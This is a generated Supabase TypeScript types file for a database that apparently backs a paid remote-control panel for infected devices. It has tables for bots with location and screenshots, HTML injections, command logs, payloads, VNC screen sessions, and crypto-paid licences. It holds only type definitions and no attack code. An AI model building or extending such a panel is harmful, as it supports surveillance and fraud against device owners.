export type Json =
  | string
  | number
  | boolean
  | null
  | { [key: string]: Json | undefined }
  | Json[]

export type Database = {
  // Allows to automatically instantiate createClient with right options
  // instead of createClient<Database, { PostgrestVersion: 'XX' }>(URL, KEY)
  __InternalSupabase: {
    PostgrestVersion: "13.0.5"
  }
  public: {
    Tables: {
      bots: {
        Row: {
          battery: number | null
          created_at: string
          id: string
          ip_address: string | null
          last_seen: string
          location: string | null
          model: string
          name: string
          os: string
          platform: string
          screenshot_url: string | null
          status: string
          updated_at: string
          user_id: string
        }
        Insert: {
          battery?: number | null
          created_at?: string
          id?: string
          ip_address?: string | null
          last_seen?: string
          location?: string | null
          model: string
          name: string
          os: string
          platform?: string
          screenshot_url?: string | null
          status?: string
          updated_at?: string
          user_id: string
        }
        Update: {
          battery?: number | null
          created_at?: string
          id?: string
          ip_address?: string | null
          last_seen?: string
          location?: string | null
          model?: string
          name?: string
          os?: string
          platform?: string
          screenshot_url?: string | null
          status?: string
          updated_at?: string
          user_id?: string
        }
        Relationships: []
      }
      crypto_addresses: {
        Row: {
          address: string
          coin: string
          created_at: string
          id: string
          is_active: boolean
          network: string
          qr_code: string | null
          updated_at: string
        }
        Insert: {
          address: string
          coin: string
          created_at?: string
          id?: string
          is_active?: boolean
          network: string
          qr_code?: string | null
          updated_at?: string
        }
        Update: {
          address?: string
          coin?: string
          created_at?: string
          id?: string
          is_active?: boolean
          network?: string
          qr_code?: string | null
          updated_at?: string
        }
        Relationships: []
      }
      features: {
        Row: {
          created_at: string
          description: string
          display_order: number
          icon: string
          id: string
          is_active: boolean
          title: string
          updated_at: string
        }
        Insert: {
          created_at?: string
          description: string
          display_order?: number
          icon?: string
          id?: string
          is_active?: boolean
          title: string
          updated_at?: string
        }
        Update: {
          created_at?: string
          description?: string
          display_order?: number
          icon?: string
          id?: string
          is_active?: boolean
          title?: string
          updated_at?: string
        }
        Relationships: []
      }
      injections: {
        Row: {
          bot_id: string | null
          created_at: string
          html_content: string
          id: string
          status: string
          user_id: string
        }
        Insert: {
          bot_id?: string | null
          created_at?: string
          html_content: string
          id?: string
          status?: string
          user_id: string
        }
        Update: {
          bot_id?: string | null
          created_at?: string
          html_content?: string
          id?: string
          status?: string
          user_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "injections_bot_id_fkey"
            columns: ["bot_id"]
            isOneToOne: false
            referencedRelation: "bots"
            referencedColumns: ["id"]
          },
        ]
      }
      licenses: {
        Row: {
          activated_at: string | null
          created_at: string
          expires_at: string | null
          id: string
          license_key: string
          package_id: string | null
          platform: string
          status: string
          user_id: string | null
        }
        Insert: {
          activated_at?: string | null
          created_at?: string
          expires_at?: string | null
          id?: string
          license_key: string
          package_id?: string | null
          platform: string
          status?: string
          user_id?: string | null
        }
        Update: {
          activated_at?: string | null
          created_at?: string
          expires_at?: string | null
          id?: string
          license_key?: string
          package_id?: string | null
          platform?: string
          status?: string
          user_id?: string | null
        }
        Relationships: [
          {
            foreignKeyName: "licenses_package_id_fkey"
            columns: ["package_id"]
            isOneToOne: false
            referencedRelation: "packages"
            referencedColumns: ["id"]
          },
        ]
      }
      logs: {
        Row: {
          bot_id: string | null
          command: string
          created_at: string
          id: string
          result: string | null
          status: string
          user_id: string
        }
        Insert: {
          bot_id?: string | null
          command: string
          created_at?: string
          id?: string
          result?: string | null
          status?: string
          user_id: string
        }
        Update: {
          bot_id?: string | null
          command?: string
          created_at?: string
          id?: string
          result?: string | null
          status?: string
          user_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "logs_bot_id_fkey"
            columns: ["bot_id"]
            isOneToOne: false
            referencedRelation: "bots"
            referencedColumns: ["id"]
          },
        ]
      }
      packages: {
        Row: {
          created_at: string
          description: string | null
          duration_days: number
          features: string[]
          id: string
          is_active: boolean
          name: string
          platform: string
          price: number
          updated_at: string
        }
        Insert: {
          created_at?: string
          description?: string | null
          duration_days: number
          features?: string[]
          id?: string
          is_active?: boolean
          name: string
          platform: string
          price: number
          updated_at?: string
        }
        Update: {
          created_at?: string
          description?: string | null
          duration_days?: number
          features?: string[]
          id?: string
          is_active?: boolean
          name?: string
          platform?: string
          price?: number
          updated_at?: string
        }
        Relationships: []
      }
      payloads: {
        Row: {
          content: string
          created_at: string
          file_url: string | null
          format: string | null
          id: string
          name: string
          platform: string | null
          type: string
          user_id: string
        }
        Insert: {
          content: string
          created_at?: string
          file_url?: string | null
          format?: string | null
          id?: string
          name: string
          platform?: string | null
          type: string
          user_id: string
        }
        Update: {
          content?: string
          created_at?: string
          file_url?: string | null
          format?: string | null
          id?: string
          name?: string
          platform?: string | null
          type?: string
          user_id?: string
        }
        Relationships: []
      }
      payments: {
        Row: {
          amount: number
          confirmed_at: string | null
          created_at: string
          crypto_address_id: string
          expires_at: string
          id: string
          package_id: string
          status: string
          transaction_hash: string | null
          user_id: string
        }
        Insert: {
          amount: number
          confirmed_at?: string | null
          created_at?: string
          crypto_address_id: string
          expires_at: string
          id?: string
          package_id: string
          status?: string
          transaction_hash?: string | null
          user_id: string
        }
        Update: {
          amount?: number
          confirmed_at?: string | null
          created_at?: string
          crypto_address_id?: string
          expires_at?: string
          id?: string
          package_id?: string
          status?: string
          transaction_hash?: string | null
          user_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "payments_crypto_address_id_fkey"
            columns: ["crypto_address_id"]
            isOneToOne: false
            referencedRelation: "crypto_addresses"
            referencedColumns: ["id"]
          },
          {
            foreignKeyName: "payments_package_id_fkey"
            columns: ["package_id"]
            isOneToOne: false
            referencedRelation: "packages"
            referencedColumns: ["id"]
          },
        ]
      }
      servers: {
        Row: {
          created_at: string
          id: string
          name: string
          status: string
          type: string
          updated_at: string
          url: string
          user_id: string
        }
        Insert: {
          created_at?: string
          id?: string
          name: string
          status?: string
          type?: string
          updated_at?: string
          url: string
          user_id: string
        }
        Update: {
          created_at?: string
          id?: string
          name?: string
          status?: string
          type?: string
          updated_at?: string
          url?: string
          user_id?: string
        }
        Relationships: []
      }
      settings: {
        Row: {
          created_at: string
          id: string
          notifications_enabled: boolean | null
          telegram_chat_id: string | null
          telegram_token: string | null
          updated_at: string
          user_id: string
        }
        Insert: {
          created_at?: string
          id?: string
          notifications_enabled?: boolean | null
          telegram_chat_id?: string | null
          telegram_token?: string | null
          updated_at?: string
          user_id: string
        }
        Update: {
          created_at?: string
          id?: string
          notifications_enabled?: boolean | null
          telegram_chat_id?: string | null
          telegram_token?: string | null
          updated_at?: string
          user_id?: string
        }
        Relationships: []
      }
      settings_global: {
        Row: {
          created_at: string
          id: string
          key: string
          updated_at: string
          value: string
        }
        Insert: {
          created_at?: string
          id?: string
          key: string
          updated_at?: string
          value: string
        }
        Update: {
          created_at?: string
          id?: string
          key?: string
          updated_at?: string
          value?: string
        }
        Relationships: []
      }
      user_roles: {
        Row: {
          created_at: string
          id: string
          role: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Insert: {
          created_at?: string
          id?: string
          role?: Database["public"]["Enums"]["app_role"]
          user_id: string
        }
        Update: {
          created_at?: string
          id?: string
          role?: Database["public"]["Enums"]["app_role"]
          user_id?: string
        }
        Relationships: []
      }
      vnc_sessions: {
        Row: {
          bot_id: string
          created_at: string
          id: string
          last_update: string
          screen_data: string | null
          status: string
          user_id: string
        }
        Insert: {
          bot_id: string
          created_at?: string
          id?: string
          last_update?: string
          screen_data?: string | null
          status?: string
          user_id: string
        }
        Update: {
          bot_id?: string
          created_at?: string
          id?: string
          last_update?: string
          screen_data?: string | null
          status?: string
          user_id?: string
        }
        Relationships: [
          {
            foreignKeyName: "vnc_sessions_bot_id_fkey"
            columns: ["bot_id"]
            isOneToOne: false
            referencedRelation: "bots"
            referencedColumns: ["id"]
          },
        ]
      }
    }
    Views: {
      [_ in never]: never
    }
    Functions: {
      get_user_role: {
        Args: { _user_id: string }
        Returns: Database["public"]["Enums"]["app_role"]
      }
      has_role: {
        Args: {
          _role: Database["public"]["Enums"]["app_role"]
          _user_id: string
        }
        Returns: boolean
      }
    }
    Enums: {
      app_role: "admin" | "user" | "demo"
    }
    CompositeTypes: {
      [_ in never]: never
    }
  }
}

type DatabaseWithoutInternals = Omit<Database, "__InternalSupabase">

type DefaultSchema = DatabaseWithoutInternals[Extract<keyof Database, "public">]

export type Tables<
  DefaultSchemaTableNameOrOptions extends
    | keyof (DefaultSchema["Tables"] & DefaultSchema["Views"])
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
        DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? (DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"] &
      DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Views"])[TableName] extends {
      Row: infer R
    }
    ? R
    : never
  : DefaultSchemaTableNameOrOptions extends keyof (DefaultSchema["Tables"] &
        DefaultSchema["Views"])
    ? (DefaultSchema["Tables"] &
        DefaultSchema["Views"])[DefaultSchemaTableNameOrOptions] extends {
        Row: infer R
      }
      ? R
      : never
    : never

export type TablesInsert<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Insert: infer I
    }
    ? I
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Insert: infer I
      }
      ? I
      : never
    : never

export type TablesUpdate<
  DefaultSchemaTableNameOrOptions extends
    | keyof DefaultSchema["Tables"]
    | { schema: keyof DatabaseWithoutInternals },
  TableName extends DefaultSchemaTableNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"]
    : never = never,
> = DefaultSchemaTableNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaTableNameOrOptions["schema"]]["Tables"][TableName] extends {
      Update: infer U
    }
    ? U
    : never
  : DefaultSchemaTableNameOrOptions extends keyof DefaultSchema["Tables"]
    ? DefaultSchema["Tables"][DefaultSchemaTableNameOrOptions] extends {
        Update: infer U
      }
      ? U
      : never
    : never

export type Enums<
  DefaultSchemaEnumNameOrOptions extends
    | keyof DefaultSchema["Enums"]
    | { schema: keyof DatabaseWithoutInternals },
  EnumName extends DefaultSchemaEnumNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"]
    : never = never,
> = DefaultSchemaEnumNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[DefaultSchemaEnumNameOrOptions["schema"]]["Enums"][EnumName]
  : DefaultSchemaEnumNameOrOptions extends keyof DefaultSchema["Enums"]
    ? DefaultSchema["Enums"][DefaultSchemaEnumNameOrOptions]
    : never

export type CompositeTypes<
  PublicCompositeTypeNameOrOptions extends
    | keyof DefaultSchema["CompositeTypes"]
    | { schema: keyof DatabaseWithoutInternals },
  CompositeTypeName extends PublicCompositeTypeNameOrOptions extends {
    schema: keyof DatabaseWithoutInternals
  }
    ? keyof DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"]
    : never = never,
> = PublicCompositeTypeNameOrOptions extends {
  schema: keyof DatabaseWithoutInternals
}
  ? DatabaseWithoutInternals[PublicCompositeTypeNameOrOptions["schema"]]["CompositeTypes"][CompositeTypeName]
  : PublicCompositeTypeNameOrOptions extends keyof DefaultSchema["CompositeTypes"]
    ? DefaultSchema["CompositeTypes"][PublicCompositeTypeNameOrOptions]
    : never

export const Constants = {
  public: {
    Enums: {
      app_role: ["admin", "user", "demo"],
    },
  },
} as const
